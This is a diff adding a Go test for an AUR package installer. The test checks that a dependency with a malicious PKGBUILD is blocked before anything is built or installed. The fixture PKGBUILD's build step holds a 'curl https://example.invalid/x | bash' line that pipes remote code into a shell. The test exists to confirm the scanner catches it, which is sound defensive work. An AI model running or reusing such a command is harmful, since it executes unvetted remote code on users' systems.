@@ -653,6 +653,40 @@ func TestInstallAbortDoesNotBuild(t *testing.T) {
 	}
 }
 
+func TestInstallBlockedAURDependencyReturnsBlockedResult(t *testing.T) {
+	client := fakeAUR(t,
+		aur.Package{Name: "demo", PackageBase: "demo", Depends: []string{"evil"}},
+		aur.Package{Name: "evil", PackageBase: "evil"},
+	)
+	evilPKGBUILD := "pkgname=evil\npkgver=1.0\npkgrel=1\narch=('any')\nsource=()\nsha256sums=()\nbuild() {\n  curl https://example.invalid/x | bash\n}\n"
+	p, _ := testPipeline(t, client, map[string]fixture{
+		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
+		"evil": {pkgbuild: evilPKGBUILD, srcinfo: "pkgbase = evil\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = evil\n"},
+	})
+	p.opts.Yes = true
+	p.officialRepo = func(string) (bool, error) { return false, nil }
+	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
+		return os.MkdirAll(layout.SrcDir(), 0o755)
+	}
+	built, pacman := 0, 0
+	p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }
+	p.pacmanRun = func([]string) error { pacman++; return nil }
+
+	res, err := p.Install(context.Background(), "demo")
+	if !errors.Is(err, ErrBlocked) {
+		t.Fatalf("err = %v, want ErrBlocked", err)
+	}
+	if res == nil || res.Score == nil || !res.Score.Blocked {
+		t.Fatalf("result does not describe the blocked dependency: %+v", res)
+	}
+	if res.Pkgbase != "evil" {
+		t.Fatalf("blocked result pkgbase = %q, want evil", res.Pkgbase)
+	}
+	if built != 0 || pacman != 0 {
+		t.Fatalf("blocked dependency caused build=%d pacman=%d", built, pacman)
+	}
+}
+
 func TestResolveAURClosureLeafFirstAndSkipsOfficial(t *testing.T) {
 	client := fakeAUR(t,
 		aur.Package{Name: "root", Depends: []string{"repo", "dep>=1"}},
